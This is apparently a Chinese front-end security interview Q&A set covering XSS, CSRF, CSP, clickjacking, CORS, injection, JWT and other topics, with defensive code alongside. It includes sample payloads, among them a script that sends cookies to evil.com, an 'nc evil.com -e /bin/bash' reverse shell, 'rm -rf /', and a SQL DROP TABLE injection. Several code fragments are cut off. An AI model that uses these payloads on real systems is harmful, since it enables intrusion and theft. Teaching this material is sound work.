### Q1: 什么是XSS攻击？有哪些类型？如何防御？ ⭐⭐⭐

**答案：**

**XSS（Cross-Site Scripting，跨站脚本攻击）** 是指攻击者向网页中注入恶意脚本，当用户浏览该页面时，恶意脚本会在用户浏览器中执行。

**三种类型：**

**1. 反射型XSS（Reflected XSS）**
- 恶意脚本通过URL参数传入，服务器未做转义直接返回页面
- 一次性触发，需要用户点击恶意链接

```
// 攻击示例URL：
https://example.com/search?q=<script>alert('XSS')</script>

// 服务端未转义直接输出：
<div>搜索结果：${query}</div>
```

**2. 存储型XSS（Stored XSS）**
- 恶意脚本被持久化存储在服务器（如数据库）
- 每次用户访问页面都会触发，危害最大

```
// 攻击者在评论区提交：
<script>
  fetch('https://evil.com/steal?cookie=' + document.cookie);
</script>

// 其他用户浏览评论区时，脚本自动执行
```

**3. DOM型XSS（DOM-based XSS）**
- 纯前端漏洞，恶意数据不经过服务器
- 通过修改DOM环境执行恶意代码

```javascript
// 不安全的DOM操作
const hash = location.hash.slice(1);
document.getElementById('output').innerHTML = hash; // 危险！

// 攻击URL：
https://example.com/page#<img src=x onerror="alert('XSS')">
```

**防御措施：**

```javascript
// 1. 输入转义（最基本）
function escapeHTML(str) {
  return str.replace(/[&<>'"]/g, (c) => ({
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    "'": '&#39;',
    '"': '&quot;'
  })[c]);
}

// 2. 使用textContent代替innerHTML
element.textContent = userInput; // 安全
// element.innerHTML = userInput; // 危险

// 3. 设置CSP（内容安全策略）
// Content-Security-Policy: default-src 'self'; script-src 'self'

// 4. HttpOnly Cookie
// Set-Cookie: session=abc; HttpOnly

// 5. 使用DOMPurify库净化HTML
import DOMPurify from 'dompurify';
const clean = DOMPurify.sanitize(dirtyHTML);

// 6. 框架自带防御
// React: JSX自动转义
// Vue: v-html需谨慎使用，{{ }}自动转义
```

### Q2: 什么是CSRF攻击？有哪些防御方案？ ⭐⭐⭐

**答案：**

**CSRF（Cross-Site Request Forgery，跨站请求伪造）** 是指攻击者诱导用户在已认证的网站上执行非预期的操作。

**攻击原理：**
1. 用户登录了银行网站 `bank.com`，浏览器保存了Cookie
2. 用户访问了恶意网站 `evil.com`
3. 恶意网站中有一个隐藏的表单，自动提交到 `bank.com/transfer`
4. 浏览器自动携带 `bank.com` 的Cookie，请求成功

```html
<!-- 恶意网站中的攻击代码 -->
<img src="https://bank.com/transfer?to=hacker&amount=10000">

<!-- 或使用隐藏表单 -->
<form action="https://bank.com/transfer" method="POST" id="attack">
  <input type="hidden" name="to" value="hacker">
  <input type="hidden" name="amount" value="10000">
</form>
<script>document.getElementById('attack').submit();</script>
```

**防御方案：**

**1. CSRF Token（最常用）**
```javascript
// 服务端生成Token，嵌入表单或请求头
// 服务端
app.get('/form', (req, res) => {
  const csrfToken = generateToken();
  req.session.csrfToken = csrfToken;
  res.render('form', { csrfToken });
});

// 前端
<form method="POST" action="/transfer">
  <input type="hidden" name="_csrf" value="${csrfToken}">
  <!-- 其他表单字段 -->
</form>

// AJAX请求
fetch('/api/transfer', {
  method: 'POST',
  headers: {
    'X-CSRF-Token': csrfToken
  },
  body: JSON.stringify(data)
});
```

**2. SameSite Cookie属性**
```
Set-Cookie: session=abc; SameSite=Strict  // 严格模式，完全禁止跨站携带
Set-Cookie: session=abc; SameSite=Lax    // 宽松模式，允许GET导航携带
Set-Cookie: session=abc; SameSite=None; Secure // 允许跨站（需HTTPS）
```

**3. 验证Referer/Origin头**
```javascript
// 服务端中间件
app.use((req, res, next) => {
  const referer = req.headers.referer;
  const origin = req.headers.origin;
  if (origin && !allowedOrigins.includes(origin)) {
    return res.status(403).send('CSRF detected');
  }
  next();
});
```

**4. 双重Cookie验证**
```javascript
// 前端请求时在请求头或参数中携带Cookie值
// 服务端验证请求头中的值与Cookie中的值是否一致
fetch('/api/data', {
  headers: {
    'X-Requested-With': 'XMLHttpRequest',
    'X-XSRF-Token': getCookie('XSRF-TOKEN')
  }
});
```

### Q3: 什么是CSP（内容安全策略）？如何配置？ ⭐⭐

**答案：**

**CSP（Content Security Policy，内容安全策略）** 是一个HTTP响应头，用于限制页面可以加载哪些资源，是防御XSS的有效手段。

**CSP指令：**
```
Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.example.com; style-src 'self' 'unsafe-inline'; img-src *; connect-src 'self' api.example.com;
```

**常用指令：**

| 指令 | 说明 |
|------|------|
| `default-src` | 默认资源加载策略（其他指令的fallback） |
| `script-src` | JavaScript来源 |
| `style-src` | CSS来源 |
| `img-src` | 图片来源 |
| `font-src` | 字体来源 |
| `connect-src` | AJAX、WebSocket等连接来源 |
| `frame-src` | iframe来源 |
| `media-src` | 音视频来源 |
| `object-src` | Flash等插件来源 |
| `base-uri` | 限制`<base>`标签 |
| `form-action` | 表单提交目标 |

**配置示例：**
```http
/* 严格模式 */
Content-Security-Policy: default-src 'none'; script-src 'self'; style-src 'self'; img-src 'self'; connect-src 'self'; font-src 'self'

/* 开发模式（使用nonce） */
Content-Security-Policy: script-src 'nonce-abc123' 'self'

/* 使用hash */
Content-Security-Policy: script-src 'sha256-B2yPHKaXnvFWtRChIbabYmUBFZdVfKKXHbWtWidDVF8='

/* 报告模式（只报告不阻止） */
Content-Security-Policy-Report-Only: default-src 'self'; report-uri /csp-report
```

**前端配合：**
```html
<!-- 使用nonce -->
<script nonce="abc123">
  // 内联脚本
</script>

<!-- 使用hash（服务端计算hash值） -->
<script>
  // 这段代码的hash值需要在CSP中声明
</script>
```

### Q4: 什么是点击劫持（Clickjacking）？如何防御？ ⭐⭐

**答案：**

**点击劫持** 是指攻击者将目标网站嵌入到恶意页面中的透明iframe里，诱导用户在不知情的情况下点击目标网站上的按钮。

```html
<!-- 攻击者页面 -->
<style>
  .attack-frame {
    position: absolute;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    opacity: 0; /* 透明 */
    z-index: 999;
  }
  .decoy-button {
    position: absolute;
    top: 100px;
    left: 200px;
  }
</style>
<button class="decoy-button">领取奖品</button>
<iframe class="attack-frame" src="https://bank.com/transfer"></iframe>
<!-- 用户以为点击"领取奖品"，实际点击了银行转账按钮 -->
```

**防御方案：**

**1. X-Frame-Options响应头（推荐）**
```http
X-Frame-Options: DENY          /* 完全禁止嵌入iframe */
X-Frame-Options: SAMEORIGIN    /* 只允许同源嵌入 */
```

**2. CSP的frame-ancestors指令**
```http
Content-Security-Policy: frame-ancestors 'none'     /* 禁止嵌入 */
Content-Security-Policy: frame-ancestors 'self'     /* 只允许同源 */
Content-Security-Policy: frame-ancestors 'self' https://trusted.com
```

**3. JavaScript防御（辅助手段）**
```javascript
// 检测是否被嵌入iframe
if (window.self !== window.top) {
  window.top.location = window.self.location;
}
```

### Q5: 什么是CORS？简单请求和预检请求有什么区别？ ⭐⭐

**答案：**

**CORS（Cross-Origin Resource Sharing，跨域资源共享）** 是W3C标准，允许服务器声明哪些源可以访问其资源。

**同源策略：** 协议 + 域名 + 端口三者完全一致才同源。

**简单请求（Simple Request）：**
同时满足以下条件：
1. 方法为 GET、HEAD、POST
2. Content-Type为 `text/plain`、`multipart/form-data`、`application/x-www-form-urlencoded`
3. 只使用了简单请求头（Accept、Accept-Language、Content-Language、Content-Type）

简单请求直接发送，浏览器会自动添加 `Origin` 请求头。

**预检请求（Preflight Request）：**
不满足简单请求条件时，浏览器会先发送一个OPTIONS请求：

```
OPTIONS /api/data HTTP/1.1
Origin: https://example.com
Access-Control-Request-Method: PUT
Access-Control-Request-Headers: Content-Type, Authorization
```

服务端响应：
```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://example.com
Access-Control-Allow-Methods: GET, POST, PUT, DELETE
Access-Control-Allow-Headers: Content-Type, Authorization
Access-Control-Allow-Credentials: true
Access-Control-Max-Age: 86400
```

**服务端配置示例：**
```javascript
// Express中间件
const cors = require('cors');
app.use(cors({
  origin: ['https://example.com'],
  methods: ['GET', 'POST', 'PUT', 'DELETE'],
  allowedHeaders: ['Content-Type', 'Authorization'],
  credentials: true,
  maxAge: 86400
}));

// Nginx配置
location /api/ {
  add_header Access-Control-Allow-Origin https://example.com;
  add_header Access-Control-Allow-Methods 'GET, POST, PUT, DELETE';
  add_header Access-Control-Allow-Headers 'Content-Type, Authorization';
  add_header Access-Control-Allow-Credentials true;
  if ($request_method = OPTIONS) {
    return 204;
  }
}
```

### Q6: 什么是SQL注入？如何防御？ ⭐⭐

**答案：**

**SQL注入** 是指攻击者通过在输入中插入恶意SQL语句，操纵数据库查询。

```javascript
// 不安全的代码
app.get('/user', (req, res) => {
  const { id } = req.query;
  // 攻击者输入: 1 OR 1=1
  const sql = `SELECT * FROM users WHERE id = ${id}`;
  db.query(sql); // 危险！
});

// 攻击示例
// 输入: 1; DROP TABLE users; --
// 最终SQL: SELECT * FROM users WHERE id = 1; DROP TABLE users; --
```

**防御措施：**

```javascript
// 1. 参数化查询（最有效）
const sql = 'SELECT * FROM users WHERE id = ?';
db.query(sql, [id]); // 安全

// 2. ORM框架
const user = await User.findByPk(id); // Sequelize
const user = await User.findById(id); // Mongoose

// 3. 输入验证
function validateId(id) {
  return /^\d+$/.test(id);
}

// 4. 最小权限原则
// 数据库用户只授予必要的权限，不使用root账户

// 5. 转义特殊字符
const escaped = connection.escape(userInput);
```

### Q7: 什么是命令注入？如何防御？ ⭐⭐

**答案：**

**命令注入** 是指攻击者在输入中插入操作系统命令，使服务器执行恶意命令。

```javascript
// 不安全的代码
const { filename } = req.query;
// 攻击者输入: file.txt; rm -rf /
const { exec } = require('child_process');
exec(`cat ${filename}`); // 危险！

// 攻击示例
// 输入: ; cat /etc/passwd
// 输入: | nc evil.com 8080 -e /bin/bash
```

**防御措施：**

```javascript
// 1. 避免使用exec，使用spawn/execFile
const { execFile } = require('child_process');
execFile('cat', [filename]); // 参数数组，不会shell解析

// 2. 输入白名单验证
const allowedFiles = ['file1.txt', 'file2.txt'];
if (!allowedFiles.includes(filename)) {
  throw new Error('Invalid filename');
}

// 3. 使用安全的API替代系统命令
const fs = require('fs');
const content = fs.readFileSync(filename, 'utf-8'); // 安全

// 4. 限制执行权限
// 运行Node.js进程的用户不应有shell执行权限
```

### Q8: 什么是中间人攻击（MITM）？HTTPS如何防止？ ⭐⭐⭐

**答案：**

**中间人攻击（Man-in-the-Middle Attack）** 是指攻击者拦截通信双方的数据，可以窃听、篡改或注入数据。

**攻击方式：**
1. ARP欺骗
2. DNS劫持
3. 伪造Wi-Fi热点
4. SSL剥离攻击

**HTTPS/TLS握手过程：**

```
1. Client Hello
   → 支持的TLS版本、加密套件列表、随机数

2. Server Hello
   ← 选择的TLS版本、加密套件、随机数
   ← 服务器证书

3. 客户端验证证书
   → 检查证书是否由可信CA签发
   → 检查域名是否匹配
   → 检查证书是否过期

4. 密钥交换
   → 客户端生成预主密钥（Pre-Master Secret）
   → 用服务器公钥加密后发送
   → 双方基于预主密钥生成会话密钥

5. 加密通信
   → 使用会话密钥进行对称加密通信
```

**HTTPS防御MITM的原理：**
1. **证书验证**：CA机构签发证书，确保服务器身份真实
2. **加密传输**：TLS加密所有通信内容，中间人无法解密
3. **完整性校验**：MAC（消息认证码）确保数据未被篡改
4. **前向安全（PFS）**：即使长期私钥泄露，历史通信仍然安全

**额外安全措施：**
```
// HSTS（HTTP Strict Transport Security）
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload

// 证书固定（Certificate Pinning）
// 只信任特定的证书或公钥
```

### Q9: Cookie有哪些安全属性？ ⭐⭐

**答案：**

```http
Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict; Path=/; Domain=.example.com; Max-Age=3600
```

| 属性 | 说明 |
|------|------|
| `HttpOnly` | 禁止JavaScript访问Cookie（document.cookie无法读取），防止XSS窃取 |
| `Secure` | 仅在HTTPS连接下发送Cookie |
| `SameSite=Strict` | 完全禁止跨站请求携带Cookie |
| `SameSite=Lax` | 允许顶级导航的GET请求携带Cookie（默认值） |
| `SameSite=None` | 允许跨站携带（必须配合Secure） |
| `Domain` | 指定Cookie的作用域 |
| `Path` | 指定Cookie的路径范围 |
| `Max-Age` | Cookie的有效期（秒） |
| `Expires` | Cookie的过期时间 |

```javascript
// 服务端设置安全Cookie
res.cookie('session', token, {
  httpOnly: true,     // 防XSS
  secure: true,       // 仅HTTPS
  sameSite: 'strict', // 防CSRF
  maxAge: 3600000,    // 1小时
  path: '/',
  domain: '.example.com'
});

// 前端注意事项
// document.cookie 无法读取 HttpOnly 的 Cookie
// 跨域请求需要 credentials: 'include'
fetch('https://api.example.com/data', {
  credentials: 'include'
});
```

### Q10: 前端常见加密方式有哪些？ ⭐⭐

**答案：**

**1. 对称加密（AES）**
- 加密和解密使用相同的密钥
- 速度快，适合大量数据加密

```javascript
// 使用Web Crypto API
async function encryptAES(key, data) {
  const cryptoKey = await crypto.subtle.importKey(
    'raw',
    key,
    { name: 'AES-GCM' },
    false,
    ['encrypt']
  );
  const iv = crypto.getRandomValues(new Uint8Array(12));
  const encrypted = await crypto.subtle.encrypt(
    { name: 'AES-GCM', iv },
    cryptoKey,
    new TextEncoder().encode(data)
  );
  return { iv, encrypted };
}
```

**2. 非对称加密（RSA）**
- 公钥加密，私钥解密
- 速度慢，适合小数据加密和密钥传输

```javascript
// RSA加密流程
// 1. 服务端生成公钥/私钥对
// 2. 客户端用公钥加密敏感数据
// 3. 服务端用私钥解密
```

**3. 哈希算法**
- 单向不可逆
- 用于密码存储、数据完整性校验

```javascript
// SHA-256哈希
async function hash(data) {
  const encoder = new TextEncoder();
  const dataBuffer = encoder.encode(data);
  const hashBuffer = await crypto.subtle.digest('SHA-256', dataBuffer);
  return Array.from(new Uint8Array(hashBuffer))
    .map(b => b.toString(16).padStart(2, '0'))
    .join('');
}

// 密码存储：使用加盐哈希
// 存储格式: salt:hash
// 注册: hash(password + salt)
// 登录: hash(inputPassword + salt) === storedHash
```

**4. Base64（编码，非加密）**
```javascript
// 注意：Base64只是编码，不是加密！
const encoded = btoa('hello'); // "aGVsbG8="
const decoded = atob('aGVsbG8='); // "hello"
```

### Q11: 什么是OAuth2.0？有哪些授权模式？ ⭐⭐⭐

**答案：**

**OAuth2.0** 是一个授权框架，允许第三方应用在用户授权下访问用户在某个服务上的资源，而不需要暴露用户的密码。

**四种授权模式：**

**1. 授权码模式（Authorization Code）—— 最安全，推荐**
```
用户 → 第三方应用 → 授权服务器（登录+授权）
                    ← 返回授权码
第三方应用 → 授权服务器（用授权码换取Token）
           ← 返回Access Token
第三方应用 → 资源服务器（用Token访问资源）
```

```javascript
// 前端跳转授权
const authUrl = `https://auth.example.com/authorize?
  response_type=code&
  client_id=xxx&
  redirect_uri=https://myapp.com/callback&
  scope=read write&
  state=random_string`;

// 回调处理
// https://myapp.com/callback?code=AUTH_CODE&state=random_string

// 后端用授权码换取Token
const tokenResponse = await fetch('https://auth.example.com/token', {
  method: 'POST',
  body: new URLSearchParams({
    grant_type: 'authorization_code',
    code: authCode,
    redirect_uri: 'https://myapp.com/callback',
    client_id: 'xxx',
    client_secret: 'yyy'
  })
});
```

**2. 隐式模式（Implicit）—— 已不推荐**
- 直接在回调URL中返回Token
- 适用于纯前端应用（SPA），但有安全隐患

**3. 密码模式（Resource Owner Password）**
- 用户直接提供用户名密码给第三方
- 仅用于高度信任的应用

**4. 客户端凭证模式（Client Credentials）**
- 适用于服务器间通信（M2M）
- 无用户参与

**PKCE增强（推荐配合授权码模式使用）：**
```javascript
// 生成code_verifier和code_challenge
const codeVerifier = generateRandomString();
const codeChallenge = await sha256(codeVerifier);

// 授权请求携带code_challenge
// Token请求携带code_verifier
// 防止授权码被截获后滥用
```

### Q12: 什么是JWT？JWT有哪些安全问题？ ⭐⭐

**答案：**

**JWT（JSON Web Token）** 是一种基于JSON的开放标准（RFC 7519），用于在各方之间安全地传输信息。

**JWT结构：**
```
Header.Payload.Signature

// Header: {"alg": "HS256", "typ": "JWT"}
// Payload: {"sub": "1234", "name": "张三", "exp": 1700000000}
// Signature: HMACSHA256(base64(header) + "." + base64(payload), secret)
```

**安全问题：**

```javascript
// 1. 算法篡改攻击
// 攻击者将Header中的alg改为"none"，伪造Token
// 防御：服务端必须强制指定算法，不接受"none"

// 2. 弱密钥
// 使用简单字符串作为密钥，容易被暴力破解
// 防御：使用足够长的随机密钥（至少256位）

// 3. 敏感信息泄露
// Payload只是Base64编码，不是加密！
// 防御：不要在Payload中存放敏感信息（密码、身份证号等）

// 4. Token未过期
// 防御：设置合理的过期时间
const token = jwt.sign(payload, secret, { expiresIn: '1h' });

// 5. XSS窃取Token
// 防御：Token存储在HttpOnly Cookie中，不存localStorage
```

**JWT vs Session：**

| 特性 | JWT | Session |
|------|-----|---------|
| 存储位置 | 客户端 | 服务端 |
| 扩展性 | 无状态，易扩展 | 有状态，需共享Session |
| 安全性 | 无法主动失效 | 可主动销毁 |
| 大小 | 较大（自包含） | 仅Session ID |
| 适用场景 | 分布式系统、API | 传统Web应用 |

### Q14: 什么是DDoS攻击？前端如何配合防御？ ⭐⭐

**答案：**

**DDoS（Distributed Denial of Service，分布式拒绝服务）** 是指攻击者利用大量受控设备向目标服务器发送海量请求，耗尽服务器资源。

**常见类型：**
1. **流量型攻击**：UDP Flood、ICMP Flood
2. **协议型攻击**：SYN Flood、Ping of Death
3. **应用层攻击**：HTTP Flood、Slowloris

**前端配合防御：**

```javascript
// 1. 接口限流（前端节流）
function throttleRequest(fn, delay) {
  let lastCall = 0;
  return function(...args) {
    const now = Date.now();
    if (now - lastCall >= delay) {
      lastCall = now;
      return fn.apply(this, args);
    }
  };
}

// 2. 请求防抖
function debounceRequest(fn, delay) {
  let timer;
  return function(...args) {
    clearTimeout(timer);
    timer = setTimeout(() => fn.apply(this, args), delay);
  };
}

// 3. 验证码（人机验证）
// 关键操作前展示验证码
// reCAPTCHA / 滑动验证 / 行为验证

// 4. 接口签名
function signRequest(params, timestamp, nonce) {
  const str = Object.keys(params).sort().map(k => `${k}=${params[k]}`).join('&');
  const raw = str + timestamp + nonce;
  return sha256(raw + SECRET);
}

// 5. 前端监控异常流量
const requestCounts = {};
function checkRateLimit(api) {
  const now = Date.now();
  if (!requestCounts[api]) requestCounts[api] = [];
  requestCounts[api] = requestCounts[api].filter(t => now - t < 60000);
  if (requestCounts[api].length > 100) {
    console.warn('Possible DDoS detected');
    return false;
  }
  requestCounts[api].push(now);
  return true;
}
```

**服务端防御（配合）：**
- 使用WAF（Web应用防火墙）
- 限流（Rate Limiting）
- IP黑名单/白名单
- CDN加速（分散流量）
- 使用Cloudflare等DDoS防护服务

### Q17: 什么是原型链污染攻击？ ⭐⭐⭐

**答案：**

**原型链污染** 是指攻击者通过修改JavaScript对象的原型，影响所有继承该原型的对象。

```javascript

  for (const key in source) {
    if (typeof source[key] === 'object' && source[key] !== null) {
      if (!target[key]) target[key] = {};
      merge(target[key], source[key]);
    } else {
      target[key] = source[key];
    }
  }
  return target;
```

```javascript
const safe = Object.create(null);

function safeMerge(target, source) {

    if (key === '__proto__' || key === 'constructor' || key === 'prototype') {
      continue; // 跳过危险属性
    }
    // ...
  }
}

// 3. 使用Object.freeze保护原型

// 4. 使用Map代替普通对象存储数据
```

### Q19: 什么是接口防重放攻击？ ⭐⭐

**答案：**

**重放攻击** 是指攻击者截获合法请求后，重复发送该请求。

**防御方案：**

```javascript
// 1. 时间戳 + Nonce
// 前端
const timestamp = Date.now();
const nonce = generateUUID();
const signature = hmacSHA256(secret, timestamp + nonce + requestBody);

fetch('/api/order', {
  method: 'POST',
  headers: {
    'X-Timestamp': timestamp,
    'X-Nonce': nonce,
    'X-Signature': signature
  },
  body: JSON.stringify(data)
});

// 服务端
// 1. 验证时间戳（5分钟内有效）
// 2. 验证Nonce是否已使用（Redis存储）
// 3. 验证签名

// 2. 服务端实现
app.use((req, res, next) => {
  const timestamp = parseInt(req.headers['x-timestamp']);
  const nonce = req.headers['x-nonce'];
  const now = Date.now();

  // 检查时间戳
  if (Math.abs(now - timestamp) > 5 * 60 * 1000) {
    return res.status(400).json({ error: 'Request expired' });
  }

  // 检查Nonce是否已使用
  if (redis.get(`nonce:${nonce}`)) {
    return res.status(400).json({ error: 'Replay detected' });
  }
  redis.set(`nonce:${nonce}`, '1', 'EX', 600);

  next();
});
```

```javascript
    const timestamp = Date.now().toString();
    const nonce = crypto.randomUUID();

    const message = [
      method.toUpperCase(),
      path,
      JSON.stringify(data),
      timestamp,
      nonce
    ].join('\n');

    const signature = await crypto.subtle.sign(
      'HMAC',
      await this.getSigningKey(),
      new TextEncoder().encode(message)
    );

    const response = await fetch(`${this.baseURL}${path}`, {
      method,
      headers: {
        'Content-Type': 'application/json',
        'X-API-Key': this.apiKey,
        'X-Timestamp': timestamp,
        'X-Nonce': nonce,
        'X-Signature': Array.from(new Uint8Array(signature))
          .map(b => b.toString(16).padStart(2, '0')).join('')
      },
      body: method !== 'GET' ? JSON.stringify(data) : undefined
    });

    if (!response.ok) throw new Error(`HTTP ${response.status}`);
    return response.json();
  }

  async getSigningKey() {
    const encoder = new TextEncoder();
    return crypto.subtle.importKey(
      'raw',
      encoder.encode(this.apiSecret),
      { name: 'HMAC', hash: 'SHA-256' },
      false,
      ['sign']
    );
  }
}
```

### Q30: 前端安全最佳实践总结 ⭐⭐

**答案：**

**1. 输入验证与输出编码**
- 所有用户输入不可信
- 输出时进行HTML转义
- 使用框架自带的安全机制（React/Vue自动转义）

**2. 内容安全策略（CSP）**
```
Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; connect-src 'self' api.example.com; frame-ancestors 'none'
```

**3. Cookie安全**
- 设置HttpOnly、Secure、SameSite属性
- 敏感Token不存localStorage

**4. HTTPS everywhere**
- 全站HTTPS
- HSTS启用

**5. 认证与授权**
- JWT设置合理过期时间
- 敏感操作二次验证
- 使用OAuth2.0 + PKCE

**6. 依赖安全**
- 定期npm audit
- 使用lock文件
- CDN资源使用SRI

**7. 代码安全**
- 生产环境移除Source Map
- 移除console.log
- 不硬编码密钥/Token
- 使用环境变量管理配置

**8. 安全响应头**
```http
Content-Security-Policy: ...
X-Frame-Options: DENY
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
Strict-Transport-Security: max-age=31536000; includeSubDomains
Referrer-Policy: strict-origin-when-cross-origin
Permissions-Policy: camera=(), microphone=(), geolocation=()
```

**9. 监控与响应**
- 接入安全监控（Sentry、CSP报告）
- 制定安全事件响应流程
- 定期安全审计
